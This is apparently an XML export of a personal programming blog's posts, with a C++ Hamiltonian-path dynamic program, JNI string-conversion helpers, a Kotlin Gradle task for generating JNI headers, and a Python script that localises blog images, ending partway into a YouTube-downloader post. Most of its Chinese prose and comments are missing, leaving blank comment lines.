&#125;</span><br><span class="line">   <span class="comment">// (0 ~ n-1)n - 1()</span></span><br><span class="line">   <span class="keyword">return</span> f[(<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">  <span class="type">int</span> weight = <span class="number">0x3F</span>;</span><br><span class="line">  std::vector&lt;<span class="type">int</span>&gt; path;</span><br><span class="line">&#125;;</span><br><span class="line">Point f[<span class="number">1</span>&lt;&lt;<span class="number">20</span>][<span class="number">20</span>]; <span class="comment">//2^20*20</span></span><br><span class="line"><span class="comment">// n, weight</span></span><br><span class="line"><span class="function">Point <span class="title">hamilton</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> weight[<span class="number">20</span>][<span class="number">20</span>])</span></span>&#123;</span><br><span class="line">  <span class="comment">// memset(f, 0x3f, sizeof(f)); // f</span></span><br><span class="line">  f[<span class="number">1</span>][<span class="number">0</span>].weight = <span class="number">0</span>; <span class="comment">// (1010)(00)0</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i ++)&#123;</span><br><span class="line">    <span class="comment">// 0...11...1</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">      <span class="comment">// </span></span><br><span class="line">      <span class="keyword">if</span>((i &gt;&gt; j) &amp; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">// iintj1j,(+1),,weight</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)&#123;</span><br><span class="line">          <span class="comment">// </span></span><br><span class="line">          <span class="keyword">if</span>((i^ (<span class="number">1</span> &lt;&lt; j)) &gt;&gt; k &amp; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// k</span></span><br><span class="line">            <span class="keyword">if</span>(f[i][j].weight &gt; f[i^(<span class="number">1</span>&lt;&lt;j)][k].weight + weight[k][j])&#123;</span><br><span class="line">              f[i][j].weight = f[i^(<span class="number">1</span>&lt;&lt;j)][k].weight + weight[k][j];</span><br><span class="line">              f[i][j].path = f[i^(<span class="number">1</span>&lt;&lt;j)][k].path;</span><br><span class="line">              f[i][j].path.<span class="built_in">push_back</span>(j);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// f[i][j]ij[i, j]minf[i][j](0x3F)ijk + jk(jk0x3F)</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// (0 ~ n-1)n - 1()</span></span><br><span class="line">  <span class="keyword">return</span> f[(<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> input[<span class="number">20</span>][<span class="number">20</span>]&#123;</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>&#125;,</span><br><span class="line">      &#123;<span class="number">4</span>, <span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>&#125;,</span><br><span class="line">      &#123;<span class="number">3</span>, <span class="number">5</span>, <span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">5</span>&#125;,</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">0x3f</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>&#125;,</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">9</span>, <span class="number">0x3f</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>&#125;,</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0x3f</span>, <span class="number">2</span>, <span class="number">0x3f</span>&#125;,</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">0x3f</span>, <span class="number">2</span>, <span class="number">0x3f</span>, <span class="number">6</span>&#125;,</span><br><span class="line">      &#123;<span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">6</span>, <span class="number">0x3f</span>&#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">auto</span> p = <span class="built_in">hamilton</span>(<span class="number">8</span>, input);</span><br><span class="line">  cout &lt;&lt; p.weight &lt;&lt;endl;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> a : p.path)</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;<span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><a href="http://home.ustc.edu.cn/~xxxujian/homework8.pdf">http://home.ustc.edu.cn/~xxxujian/homework8.pdf</a><br> <em> &#x2F; </em></p></blockquote><center> -END-</center>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ jstring to string (UTF16-UTF8)</title>
      <link href="/2021/06/11/C++-jstring-to-string-(UTF16-%EF%BC%9EUTF8)/"/>
      <url>/2021/06/11/C++-jstring-to-string-(UTF16-%EF%BC%9EUTF8)/</url>
      
        <content type="html"><![CDATA[<p>JNIjstringstd::stringutf16C++utf8utf8<br><a href="https://github.com/nemtrif/utfcpp">utfcpp</a><br>source<code>#include &quot;utf8.h&quot;</code></p><p>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string <span class="title">Tools::jstring2str</span><span class="params">(jstring jStr, JNIEnv* env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!jStr) &#123;</span><br><span class="line">        <span class="comment">//:kotlin</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::u16string s = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">const</span> <span class="type">char16_t</span>*&gt;(env-&gt;<span class="built_in">GetStringChars</span>(jStr, <span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">if</span>(s.<span class="built_in">length</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//:kotlin</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::string x;</span><br><span class="line">    utf8::<span class="built_in">utf16to8</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), std::<span class="built_in">back_inserter</span>(x));</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">jstring <span class="title">str2jstring</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* stra, JNIEnv* env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!stra)&#123;</span><br><span class="line">        <span class="comment">//:C++</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">std::string <span class="title">str</span><span class="params">(stra)</span></span>;</span><br><span class="line">    std::vector&lt;<span class="type">unsigned</span> <span class="type">short</span>&gt; utf16line;</span><br><span class="line">    utf8::<span class="built_in">utf8to16</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>(), std::<span class="built_in">back_inserter</span>(utf16line));</span><br><span class="line">    <span class="keyword">auto</span>* c = <span class="keyword">new</span> jchar[utf16line.<span class="built_in">size</span>()];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;utf16line.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">        c[i] = utf16line[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewString</span>((<span class="type">const</span> jchar*)c, (jsize)utf16line.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://stackoverflow.com/questions/32205446/getting-true-utf-8-characters-in-java-jni">https://stackoverflow.com/questions/32205446/getting-true-utf-8-characters-in-java-jni</a><br>jnijniutf8utf16</p><p>: <a href="https://chromium.googlesource.com/chromium/src/base/+/refs/heads/main/android/jni_string.cc#27">https://chromium.googlesource.com/chromium/src/base/+/refs/heads/main/android/jni_string.cc#27</a></p>]]></content>
      
      
      <categories>
          
          <category> HelperCodes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cpp </tag>
            
            <tag> JNI </tag>
            
            <tag> Encoding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kotlin-jni</title>
      <link href="/2021/05/14/kotlin-%E7%94%9F%E6%88%90jni%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
      <url>/2021/05/14/kotlin-%E7%94%9F%E6%88%90jni%E5%A4%B4%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>kotlinjni<br> javah java &gt;&#x3D; 1.9 javac -hjavackotlinkotlinc -h </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>stackoverflowgradle taskcomplieKotlin(kotlinc)classjavacjavajavac -h javajnigradle kotlin dsl(kts)</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>build.gradle.ktssyncgradlegradle taskbuildgenerate jniheader<a href="https://stackoverflow.com/a/65661275/14646226">StackOverflowhttps://stackoverflow.com/a/65661275/14646226</a></p><p><code>inputs.dir(&quot;src/main/kotlin&quot;)</code>kt, <code>outputs.dir(&quot;src/main/generated/jni&quot;)</code></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> generateJniHeaders: Task <span class="keyword">by</span> tasks.creating &#123;</span><br><span class="line">    group = <span class="string">&quot;build&quot;</span></span><br><span class="line">    dependsOn(tasks.getByName(<span class="string">&quot;compileKotlin&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// For caching</span></span><br><span class="line">    inputs.dir(<span class="string">&quot;src/main/kotlin&quot;</span>)</span><br><span class="line">    outputs.dir(<span class="string">&quot;src/main/generated/jni&quot;</span>)</span><br><span class="line"></span><br><span class="line">    doLast &#123;</span><br><span class="line">        <span class="keyword">val</span> javaHome = org.gradle.<span class="keyword">internal</span>.jvm.Jvm.current().javaHome</span><br><span class="line">        <span class="keyword">val</span> javap = javaHome.resolve(<span class="string">&quot;bin&quot;</span>).walk().firstOrNull &#123; it.name.startsWith(<span class="string">&quot;javap&quot;</span>) &#125;?.absolutePath ?: error(<span class="string">&quot;javap not found&quot;</span>)</span><br><span class="line">        <span class="keyword">val</span> javac = javaHome.resolve(<span class="string">&quot;bin&quot;</span>).walk().firstOrNull &#123; it.name.startsWith(<span class="string">&quot;javac&quot;</span>) &#125;?.absolutePath ?: error(<span class="string">&quot;javac not found&quot;</span>)</span><br><span class="line">        <span class="keyword">val</span> buildDir = file(<span class="string">&quot;build/classes/kotlin/main&quot;</span>)</span><br><span class="line">        <span class="keyword">val</span> tmpDir = file(<span class="string">&quot;build/tmp/jvmJni&quot;</span>).apply &#123; mkdirs() &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> bodyExtractingRegex = <span class="string">&quot;&quot;&quot;^.+\Rpublic \w* ?class ([^\s]+).*\&#123;\R((?s:.+))\&#125;\R$&quot;&quot;&quot;</span>.toRegex()</span><br><span class="line">        <span class="keyword">val</span> nativeMethodExtractingRegex = <span class="string">&quot;&quot;&quot;.*\bnative\b.*&quot;&quot;&quot;</span>.toRegex()</span><br><span class="line"></span><br><span class="line">        buildDir.walkTopDown()</span><br><span class="line">            .filter &#123; <span class="string">&quot;META&quot;</span> !<span class="keyword">in</span> it.absolutePath &#125;</span><br><span class="line">            .forEach &#123; file -&gt;</span><br><span class="line">                <span class="keyword">if</span> (!file.isFile) <span class="keyword">return</span><span class="symbol">@forEach</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">val</span> output = com.gradle.publish.plugin.dep.org.apache.commons.io.output.ByteArrayOutputStream().use &#123;</span><br><span class="line">                    project.exec &#123;</span><br><span class="line">                        commandLine(javap, <span class="string">&quot;-private&quot;</span>, <span class="string">&quot;-cp&quot;</span>, buildDir.absolutePath, file.absolutePath)</span><br><span class="line">                        standardOutput = it</span><br><span class="line">                    &#125;.assertNormalExitValue()</span><br><span class="line">                    it.toString()</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">val</span> (qualifiedName, methodInfo) = bodyExtractingRegex.find(output)?.destructured ?: <span class="keyword">return</span><span class="symbol">@forEach</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">val</span> lastDot = qualifiedName.lastIndexOf(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                <span class="keyword">val</span> packageName = qualifiedName.substring(<span class="number">0</span>, lastDot)</span><br><span class="line">                <span class="keyword">val</span> className = qualifiedName.substring(lastDot+<span class="number">1</span>, qualifiedName.length)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">val</span> nativeMethods =</span><br><span class="line">                    nativeMethodExtractingRegex.findAll(methodInfo).mapNotNull &#123; it.groups &#125;.flatMap &#123; it.asSequence().mapNotNull &#123; group -&gt; group?.value &#125; &#125;.toList()</span><br><span class="line">                <span class="keyword">if</span> (nativeMethods.isEmpty()) <span class="keyword">return</span><span class="symbol">@forEach</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">val</span> source = buildString &#123;</span><br><span class="line">                    appendLine(<span class="string">&quot;package <span class="variable">$packageName</span>;&quot;</span>)</span><br><span class="line">                    appendLine(<span class="string">&quot;public class <span class="variable">$className</span> &#123;&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> (method <span class="keyword">in</span> nativeMethods) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="string">&quot;()&quot;</span> <span class="keyword">in</span> method) appendLine(method)</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">val</span> updatedMethod = StringBuilder(method).apply &#123;</span><br><span class="line">                                <span class="keyword">var</span> count = <span class="number">0</span></span><br><span class="line">                                <span class="keyword">var</span> i = <span class="number">0</span></span><br><span class="line">                                <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">this</span>[i] == <span class="string">&#x27;,&#x27;</span> || <span class="keyword">this</span>[i] == <span class="string">&#x27;)&#x27;</span>) insert(i, <span class="string">&quot; arg<span class="subst">$&#123;count++&#125;</span>&quot;</span>.also &#123; i += it.length + <span class="number">1</span> &#125;)</span><br><span class="line">                                    <span class="keyword">else</span> i++</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            appendLine(updatedMethod)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    appendLine(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">val</span> outputFile = tmpDir.resolve(packageName.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>)).apply &#123; mkdirs() &#125;.resolve(<span class="string">&quot;<span class="variable">$className</span>.java&quot;</span>).apply &#123; delete() &#125;.apply &#123; createNewFile() &#125;</span><br><span class="line">                outputFile.writeText(source)</span><br><span class="line"></span><br><span class="line">                project.exec &#123;</span><br><span class="line">                    commandLine(javac, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;src/main/generated/jni&quot;</span>, outputFile.absolutePath)</span><br><span class="line">                &#125;.assertNormalExitValue()</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gradle-task"><a href="#gradle-task" class="headerlink" title="gradle task"></a>gradle task</h2><p><img src="/images/kotlin-%E7%94%9F%E6%88%90jni%E5%A4%B4%E6%96%87%E4%BB%B6.md-0.png" alt="gradle task"></p>]]></content>
      
      
      <categories>
          
          <category> HelperCodes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JNI </tag>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonhexo</title>
      <link href="/2021/03/31/python%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BD%E4%B8%8E%E6%9B%BF%E6%8D%A2hexo%E5%8D%9A%E5%AE%A2%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87%E5%9C%B0%E5%9D%80/"/>
      <url>/2021/03/31/python%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BD%E4%B8%8E%E6%9B%BF%E6%8D%A2hexo%E5%8D%9A%E5%AE%A2%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<p>hexo, , </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2021/3/31</span></span><br><span class="line"><span class="comment"># @Update: 2024/02/09</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: downloadImage.py</span></span><br><span class="line"><span class="keyword">import</span> mimetypes, os, pathlib, re, requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = pathlib.Path(<span class="string">&quot;blog/source&quot;</span>)</span><br><span class="line">    image_p = p / <span class="string">&quot;images&quot;</span></span><br><span class="line">    post_p = p / <span class="string">&quot;_posts&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> post_p.exists():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;post_p.absolute()&#125;</span> noy found&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.chmod(post_p, <span class="number">0o755</span>)</span><br><span class="line">    image_p.mkdir(exist_ok=<span class="literal">True</span>)</span><br><span class="line">    os.chmod(p, <span class="number">0o755</span>)</span><br><span class="line">    <span class="comment"># .md</span></span><br><span class="line">    post_p.glob(<span class="string">&quot;*.md&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> post_p.glob(<span class="string">&quot;*.md&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(file)</span><br><span class="line">        <span class="comment"># utf8</span></span><br><span class="line">        f = <span class="built_in">open</span>(file, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        content = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="comment"># markdown  ![tag](url)</span></span><br><span class="line">        <span class="keyword">for</span> text <span class="keyword">in</span> re.findall(<span class="string">r&quot;\!\[[^\s].*\]\([a-zA-z]+:\/\/[^\s]*\)&quot;</span>, content):</span><br><span class="line">            <span class="built_in">print</span>(text)</span><br><span class="line">            <span class="comment"># tag</span></span><br><span class="line">            tag = re.findall(<span class="string">r&quot;\!\[[^\s].*\](?=\([a-zA-z]+:\/\/[^\s]*\))&quot;</span>, text)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># url</span></span><br><span class="line">            urldata = re.findall(<span class="string">r&quot;(?&lt;=\!\[[^\s].*\])\([a-zA-z]+:\/\/[^\s]*\)&quot;</span>, text)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            u = urldata[<span class="number">1</span>:<span class="built_in">len</span>(urldata) - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            name = file.name + <span class="string">&quot;-&quot;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            response = requests.get(u)</span><br><span class="line">            <span class="comment"># content-type.png/.jpg</span></span><br><span class="line">            content_type = response.headers[<span class="string">&#x27;content-type&#x27;</span>]</span><br><span class="line">            extension = mimetypes.guess_extension(content_type)</span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            img = response.content</span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(image_p / (name + extension), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(img)</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            new_u = <span class="string">&quot;/images/&quot;</span> + name + extension</span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            content = content.replace(text, tag + <span class="string">&quot;(&quot;</span> + new_u + <span class="string">&quot;)&quot;</span>)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        f = <span class="built_in">open</span>(file, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">        f.write(content)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> HelperCodes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonyoutude</title>
      <link href="/2021/01/11/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8/"/>
      <url>/2021/01/11/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p> <a href="https://en.savefrom.net/terms.html">savefrom</a><br><strong>savefrom.net</strong></p></blockquote><h2 id="0-"><a href="#0-" class="headerlink" title="0. "></a>0. </h2><p>pythonsavefromyoutubesavefromjavascript<br>python<br><a href="https://stackoverflow.com/questions/65443895/how-to-input-data-via-a-post-request-using-requests-in-python/65650186#65650186">stakoverflow </a></p><h2 id="1-"><a href="#1-" class="headerlink" title="1."></a>1.</h2><h2 id="i-savfrom-net"><a href="#i-savfrom-net" class="headerlink" title="i.savfrom.net"></a>i.savfrom.net</h2><p>youtube</p><h2 id="2-"><a href="#2-" class="headerlink" title="2. "></a>2. </h2><h3 id="i-"><a href="#i-" class="headerlink" title="i."></a>i.</h3><p><a href="https://en.savefrom.net/1-youtube-video-downloader-4/">https://en.savefrom.net/1-youtube-video-downloader-4/</a>from<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-0.png" alt="video"></p><h3 id="ii-url"><a href="#ii-url" class="headerlink" title="ii. url"></a>ii. url</h3><p>chrome<code>F12</code><code>Network</code><br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-1.png" alt="Network"><br>youtube<code>https://www.youtube.com/watch?v=IjJmTeBSEzU</code><code>Download</code>urlurl<code>network</code><code>saveform.php</code>(htmlformsrc<code>savform.php</code>)<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-2.png" alt="saveform"><br></p><h3 id="iii-"><a href="#iii-" class="headerlink" title="iii. "></a>iii. 